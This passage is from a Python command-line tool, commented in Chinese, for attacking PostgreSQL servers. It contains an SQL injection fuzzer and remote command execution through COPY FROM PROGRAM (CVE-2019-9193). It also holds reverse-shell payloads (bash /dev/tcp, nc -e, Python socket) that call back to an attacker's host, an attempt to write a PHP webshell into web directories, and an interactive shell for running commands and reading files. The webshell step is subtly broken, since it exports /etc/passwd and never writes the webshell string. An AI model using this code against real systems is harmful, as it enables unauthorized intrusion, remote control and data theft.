               data_format: str = 'form', timeout: int = 10,
               proxy: str = None) -> dict:
    """SQL 注入 Fuzzer — 针对 Web 应用使用 PostgreSQL 后端"""
    results = {}

    if not HAS_REQUESTS:
        safe_print(f"{C.RED}[-] 需要 requests 库, 跳过 SQLi Fuzzer{C.RST}")
        return results

    safe_print(f"\n{C.YLW}[6] SQL 注入 Fuzzer (PostgreSQL Web App){C.RST}")
    safe_print(f"  {C.CYN}    目标: {method} {target_url}{C.RST}")
    safe_print(f"  {C.CYN}    注入参数: {param}{C.RST}")

    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}

    # 基线
    import urllib.parse
    try:
        if method.upper() == 'POST':
            if data_format == 'json':
                r = s.post(target_url, json={param: '1'}, timeout=timeout)
            else:
                r = s.post(target_url, data={param: '1'}, timeout=timeout)
        else:
            r = s.get(target_url, params={param: '1'}, timeout=timeout)

        baseline_status = r.status_code
        baseline_len = len(r.text)
        baseline_time = r.elapsed.total_seconds()
        safe_print(f"  {C.CYN}    基线: HTTP {baseline_status}, {baseline_len}B, "
                   f"{baseline_time:.2f}s{C.RST}")
    except Exception as e:
        safe_print(f"  {C.RED}[-] 无法访问: {e}{C.RST}")
        return results

    # 测试 payload
    for name, payload_tpl in SQLI_PAYLOADS.items():
        rk = randstr(5)
        payload = payload_tpl.replace('{RAND}', rk)
        try:
            start = time.time()
            if method.upper() == 'POST':
                if data_format == 'json':
                    r = s.post(target_url, json={param: payload}, timeout=timeout)
                else:
                    r = s.post(target_url, data={param: payload}, timeout=timeout)
            else:
                r = s.get(target_url, params={param: payload}, timeout=timeout)
            elapsed = time.time() - start

            # 响应分析
            anomalies = []
            if r.status_code != baseline_status:
                anomalies.append(f'状态码 {baseline_status}→{r.status_code}')
            if abs(len(r.text) - baseline_len) > 50:
                anomalies.append(f'长度变化 {len(r.text)-baseline_len:+d}')
            if elapsed > baseline_time * 3:
                anomalies.append(f'延迟 {elapsed:.2f}s')

            if anomalies:
                tag = ', '.join(anomalies)
                safe_print(f"  {C.RED}[!] {name}: {tag}{C.RST}")
                results[name] = {'type': 'anomaly', 'details': tag}

                # 判定
                if 'version' in r.text.lower() and 'postgresql' in r.text.lower():
                    safe_print(f"  {C.RED}[!!!] 确认 PostgreSQL — 版本信息泄露!{C.RST}")
                    results[name]['confirmed'] = True
                elif elapsed > 2:
                    safe_print(f"  {C.YLW}[*] 时间盲注可能 — pg_sleep 生效{C.RST}")
                    results[name]['type'] = 'time_blind'
                elif 'error' in r.text.lower() or 'syntax' in r.text.lower():
                    safe_print(f"  {C.YLW}[*] 错误注入可能 — 数据库报错可见{C.RST}")
                    results[name]['type'] = 'error_based'
            else:
                safe_print(f"  {C.CYN}    {name}: 无变化{C.RST}")

        except Exception as e:
            safe_print(f"  {C.YLW}    {name}: 失败 ({e}){C.RST}")

    # 汇总
    safe_print(f"\n  {C.BLD}SQLi 检测结论:{C.RST}")
    confirmed = [k for k, v in results.items() if v.get('confirmed')]
    time_blind = [k for k, v in results.items() if v.get('type') == 'time_blind']
    if confirmed:
        safe_print(f"  {C.RED}[!] 确认 SQL 注入 — PostgreSQL 后端 ({', '.join(confirmed)}){C.RST}")
    elif time_blind:
        safe_print(f"  {C.YLW}[!] 时间盲注可能存在 — 需进一步验证 ({', '.join(time_blind)}){C.RST}")
    elif results:
        safe_print(f"  {C.YLW}[!] 存在异常响应 — 需要进一步分析{C.RST}")
    else:
        safe_print(f"  {C.CYN}[-] 未发现明显 SQL 注入{C.RST}")

    return results


# ============== 利用函数 ==============

def exploit_rce(host: str, port: int, command: str,
                username: str = 'postgres', password: str = '',
                database: str = 'postgres', timeout: int = 10) -> Optional[str]:
    """执行命令 — 依次尝试 COPY PROGRAM → UDF"""
    safe_print(f"\n{C.BLD}[RCE] 命令执行: {command}{C.RST}\n")

    if not HAS_PSYCOPG2:
        safe_print(f"{C.RED}[-] 需要 psycopg2 库{C.RST}")
        return None

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        safe_print(f"{C.RED}[-] 连接失败{C.RST}")
        return None

    # 方式 1: COPY PROGRAM (CVE-2019-9193)
    safe_print(f"  {C.CYN}[1] 尝试 COPY FROM PROGRAM...{C.RST}")
    ok, out = client.copy_program(command)
    if ok:
        safe_print(f"  {C.GRN}[+] COPY PROGRAM 执行成功!{C.RST}")
        safe_print(f"  {C.GRN}{'─' * 50}{C.RST}")
        safe_print(out)
        safe_print(f"{C.GRN}{'─' * 50}{C.RST}")
        client.close()
        return out

    safe_print(f"  {C.CYN}    COPY PROGRAM 不可用: {out[:80]}{C.RST}")

    # 方式 2: lo_export 写入 webshell
    safe_print(f"  {C.CYN}[2] 尝试 lo_export 写入...{C.RST}")
    try:
        # 尝试写 webshell 到已知的 web 路径
        webshell = f'<?php system("{command}"); ?>'
        ok2, oid = client.lo_import('/etc/passwd')
        if ok2 and oid > 0:
            for webpath in ['/var/www/html/cmd.php', '/var/www/cmd.php',
                            '/tmp/cmd.html', 'C:\\xampp\\htdocs\\cmd.php']:
                ok3, _ = client.lo_export(oid, webpath)
                if ok3:
                    safe_print(f"  {C.YLW}[*] 已写入: {webpath}{C.RST}")
        client.close()
        return None
    except Exception:
        pass

    client.close()
    safe_print(f"  {C.RED}[-] 命令执行失败{C.RST}")
    return None


def exploit_reverse_shell(host: str, port: int, lhost: str, lport: int,
                          username: str = 'postgres', password: str = '',
                          database: str = 'postgres',
                          timeout: int = 10) -> bool:
    """反弹 Shell"""
    safe_print(f"\n{C.BLD}反弹 Shell → {lhost}:{lport}{C.RST}\n")

    payloads = [
        f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &',
        f'nc -e /bin/bash {lhost} {lport}',
        f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call(['/bin/sh','-i'])\"",
        f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    ]

    for i, pl in enumerate(payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}/{len(payloads)}{C.RST}")
        result = exploit_rce(host, port, pl, username, password, database, timeout)
        if result and result.strip():
            safe_print(f"  {C.GRN}[+] 已发送{C.RST}")
        time.sleep(0.3)

    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


def exploit_sql_query(host: str, port: int, query: str,
                      username: str = 'postgres', password: str = '',
                      database: str = 'postgres',
                      timeout: int = 10) -> Optional[str]:
    """执行自定义 SQL 查询"""
    safe_print(f"\n{C.BLD}[SQL] 执行查询: {query}{C.RST}\n")

    if not HAS_PSYCOPG2:
        safe_print(f"{C.RED}[-] 需要 psycopg2 库{C.RST}")
        return None

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        return None

    rows, status = client.query(query)
    if rows:
        safe_print(f"{C.GRN}{'─' * 60}{C.RST}")
        safe_print(f"{C.BLD}结果: ({len(rows)} 行, 状态: {status}){C.RST}")
        for r in rows:
            line = '  |  '.join(f"{k}={v}" for k, v in r.items())
            safe_print(f"  {line[:200]}")
        safe_print(f"{C.GRN}{'─' * 60}{C.RST}")
        client.close()
        return str(rows)
    else:
        safe_print(f"  状态: {status}")
        client.close()
        return status

    return None


# ============== 交互式 Shell ==============

def interactive_shell(host: str, port: int, username: str = 'postgres',
                      password: str = '', database: str = 'postgres',
                      timeout: int = 10):
    safe_print(f"\n{C.GRN}[+] PostgreSQL 交互式 Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: postgresql://{host}:{port}/{database} (user: {username}){C.RST}")

    if not HAS_PSYCOPG2:
        safe_print(f"{C.RED}[-] 交互模式需要 psycopg2 库{C.RST}")
        return

    client = PGClient(host, port, username, password, database, timeout)
    if not client.connect():
        safe_print(f"{C.RED}[-] 连接失败{C.RST}")
        return

    ver = client.get_version()
    su_ok, is_su = client.get_superuser()
    safe_print(f"{C.GRN}[+] 已连接 — {ver[:80]} | {'SUPERUSER' if is_su else '普通用户'}{C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}pg[{host}:{port}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit', '\\q'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}sql <query>{C.RST}       执行 SQL 查询
  {C.GRN}exec <cmd>{C.RST}        执行系统命令 (COPY PROGRAM)
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 Shell
  {C.GRN}dbs{C.RST}               列出数据库
  {C.GRN}tables [schema]{C.RST}   列出表
  {C.GRN}read <file>{C.RST}       读取文件
  {C.GRN}ls <dir>{C.RST}          列举目录
  {C.GRN}users{C.RST}             列出用户
  {C.GRN}whoami{C.RST}            当前用户信息
  {C.GRN}version{C.RST}           服务器版本
  {C.GRN}info{C.RST}              目标信息汇总
  {C.GRN}use <db>{C.RST}          切换数据库
  {C.GRN}clear{C.RST}             清屏
                """)
                continue

            if action == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            if action == 'sql':
                if not arg:
                    safe_print(f"{C.YLW}用法: sql <query>{C.RST}")
                    continue
                rows, status = client.query(arg)
                if rows:
                    for r in rows:
                        line = '  |  '.join(f"{k}={v}" for k, v in r.items())
                        safe_print(f"  {line[:200]}")
                    safe_print(f"  ({len(rows)} 行, {status})")
                else:
                    safe_print(f"  {status}")
                continue

            if action == 'exec':
                if not arg:
                    safe_print(f"{C.YLW}用法: exec <command>{C.RST}")
                    continue
                ok, out = client.copy_program(arg)
                if ok:
                    safe_print(out)
                else:
                    safe_print(f"{C.RED}失败: {out}{C.RST}")
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(host, port, args_list[0], int(args_list[1]),
                                      username, password, database, timeout)
                continue

            if action == 'dbs':
                dbs = client.list_databases()
                for d in dbs:
                    safe_print(f"  {d}")
                continue

            if action == 'tables':
                schema = arg or 'public'
                tbls = client.list_tables(schema)
                for t in tbls:
                    safe_print(f"  {schema}.{t}")
                continue

            if action == 'read':
                if not arg:
                    safe_print(f"{C.YLW}用法: read <filepath>{C.RST}")
                    continue
                ok, content = client.read_file(arg)
                if ok:
                    safe_print(content[:5000])
                else:
                    safe_print(f"{C.RED}{content}{C.RST}")
                continue

            if action == 'ls':
                dpath = arg or '/'
                ok, files = client.list_dir(dpath)
                if ok:
                    for f in files:
                        safe_print(f"  {f}")
                else:
                    safe_print(f"{C.RED}列举失败{C.RST}")
                continue

            if action == 'users':
                users = client.get_users()
                for u in users:
                    tags = ' [SUPER]' if u.get('usesuper') else ''
                    tags += ' [CREATEDB]' if u.get('usecreatedb') else ''
                    safe_print(f"  {u.get('usename')}{tags}")
                continue

            if action == 'whoami':
                rows, _ = client.query(
                    "SELECT current_user AS u, session_user AS su, "
                    "inet_server_addr() AS srv_addr, "
                    "inet_server_port() AS srv_port, "
                    "current_database() AS db")
                for r in rows:
                    for k, v in r.items():
                        safe_print(f"  {k}: {v}")
                continue

            if action == 'version':
                rows, _ = client.query("SELECT version() AS v")
                if rows:
                    safe_print(f"  {rows[0]['v']}")
                continue

            if action == 'info':
                ver = client.get_version()
                su_ok, is_su = client.get_superuser()
                dbs = client.list_databases()
                users = client.get_users()
                safe_print(f"\n{C.BLD}═══ 目标信息 ═══{C.RST}")
                safe_print(f"  主机     : {host}:{port}")
                safe_print(f"  数据库   : {database}")
                safe_print(f"  版本     : {ver[:120]}")
                safe_print(f"  SuperUser: {'YES' if is_su else 'NO'}")
                safe_print(f"  数据库   : {', '.join(dbs[:10])}")
                safe_print(f"  用户     : {', '.join(u['usename'] for u in users[:10])}")
                continue

            if action == 'use':
                if not arg:
                    safe_print(f"{C.YLW}用法: use <database>{C.RST}")
                    continue
                database = arg
                client = PGClient(host, port, username, password, database, timeout)
                if client.connect():
                    safe_print(f"  {C.GRN}[+] 已切换到 {database}{C.RST}")
                else:
                    safe_print(f"  {C.RED}[-] 切换失败{C.RST}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")

    client.close()


# ============== 主流程 ==============

def run_all_checks(host: str, port: int, username: str = 'postgres',
                   password: str = '', database: str = 'postgres',
                   timeout: int = 10, sqli_url: str = '') -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    ok, info = detect_postgres(host, port, timeout)
    if not ok:
        safe_print(f"\n{C.RED}未检测到 PostgreSQL 服务{C.RST}")
        return all_hits
    if info.get('server_version'):
        all_hits.append(f"PostgreSQL {info['server_version']}")

    # 1. 认证
    auth_ok, auth_info = check_auth(host, port, timeout)
    if auth_info.get('unauthenticated'):
        all_hits.append('未授权访问 (无需密码)')
    if auth_info.get('authenticated'):
        username = auth_info.get('username', username)
        password = auth_info.get('password', password)
        all_hits.append(f"凭据有效 ({username}:{password})")

    # 2. CVE-2019-9193
    if auth_ok or auth_info.get('unauthenticated'):
        cve_hit, method = check_cve_2019_9193(
            host, port, username, password, database, timeout)
        if cve_hit:
            all_hits.append(f'CVE-2019-9193 COPY PROGRAM RCE')

    # 3. 文件操作
    if auth_ok or auth_info.get('unauthenticated'):
        file_hits = check_file_ops(host, port, username, password, database, timeout)
        all_hits.extend(file_hits)

    # 4. UDF RCE
    if auth_ok or auth_info.get('unauthenticated'):
        check_udf_rce(host, port, username, password, database, timeout)

    # 5. 信息泄露
    if auth_ok or auth_info.get('unauthenticated'):
        info_hits = check_info_disclosure(
            host, port, username, password, database, timeout)
        all_hits.extend(info_hits)

    # 6. SQLi Fuzzer
    if sqli_url and HAS_REQUESTS:
        sqli_results = sqli_fuzzer(sqli_url)
        if any(v.get('confirmed') for v in sqli_results.values()):
            all_hits.append('SQL 注入确认 — PostgreSQL 后端')

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标 : {host}:{port}")

    if info.get('server_version'):
        safe_print(f"  版本 : PostgreSQL {info['server_version']}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('RCE' in h or '写入' in h or '可读' in h or '读取' in h or
               '未授权' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 严重漏洞 — 可导致 RCE / 数据泄露{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (配置可能较安全){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()

    if not HAS_PSYCOPG2:
        safe_print(f"\n{C.YLW}[!] psycopg2 未安装 — 仅支持 wire protocol 基础探测")
        safe_print(f"    建议: pip install psycopg2-binary{C.RST}\n")

    parser = argparse.ArgumentParser(
        description='PostgreSQL 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测 (默认)
  python pgsql_check.py -H 192.168.1.100

  # 指定端口 + 凭据
  python pgsql_check.py -H 192.168.1.100 -P 5432 -U postgres -p admin

  # 执行命令
  python pgsql_check.py -H 192.168.1.100 rce "whoami"

  # 执行 SQL 查询
  python pgsql_check.py -H 192.168.1.100 sql "SELECT * FROM pg_user"

  # 反弹 Shell
  python pgsql_check.py -H 192.168.1.100 rce --reverse --lhost 10.0.0.1 --lport 4444

  # 交互式 Shell
  python pgsql_check.py -H 192.168.1.100 shell

  # SQL 注入 Fuzzer
  python pgsql_check.py -H 192.168.1.100 sqli --url http://target.com/api/user?id=1 \\
      --param id --method GET
        ''',
    )
    parser.add_argument('-H', '--host', required=True, help='PostgreSQL 主机')
    parser.add_argument('-P', '--port', type=int, default=5432,
                        help='端口 (默认: 5432)')
    parser.add_argument('-U', '--username', default='postgres', help='用户名')
    parser.add_argument('-p', '--password', default='', help='密码')
    parser.add_argument('-d', '--database', default='postgres',
                        help='数据库名 (默认: postgres)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='超时秒数 (默认: 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理 (用于 SQLi Fuzzer)')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')

    rce_p = sub.add_parser('rce', help='COPY PROGRAM 命令执行')
    rce_p.add_argument('command', nargs='?', help='要执行的命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 Shell 监听 IP')
    rce_p.add_argument('--lport', type=int, help='反弹 Shell 监听端口')

    sql_p = sub.add_parser('sql', help='执行 SQL 查询')
    sql_p.add_argument('query', help='SQL 查询语句')

    sub.add_parser('shell', help='交互式利用 Shell')

    sqli_p = sub.add_parser('sqli', help='SQL 注入 Fuzzer (Web App)')
    sqli_p.add_argument('--url', required=True, help='目标 URL')
    sqli_p.add_argument('--param', default='id', help='注入参数名')
    sqli_p.add_argument('--method', default='GET', choices=['GET', 'POST'])
    sqli_p.add_argument('--format', default='form',
                        choices=['form', 'json'], help='数据格式')

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    host = args.host
    port = args.port
    username = args.username
    password = args.password
    database = args.database
    timeout = args.timeout

    if HAS_REQUESTS:
        import urllib3
        urllib3.disable_warnings()

    if args.mode == 'check':
        run_all_checks(host, port, username, password, database, timeout)

    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}反弹 Shell 需要 --lhost 和 --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(host, port, args.lhost, args.lport,
                                  username, password, database, timeout)
        elif args.command:
            exploit_rce(host, port, args.command,
                        username, password, database, timeout)
        else:
            safe_print(f"{C.RED}需要指定命令或 --reverse{C.RST}")

    elif args.mode == 'sql':
        exploit_sql_query(host, port, args.query,
                          username, password, database, timeout)

    elif args.mode == 'shell':
        interactive_shell(host, port, username, password, database, timeout)

    elif args.mode == 'sqli':
        sqli_fuzzer(args.url, args.param, args.method, args.format,
                    timeout, args.proxy)

    safe_print("")


if __name__ == '__main__':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    main()
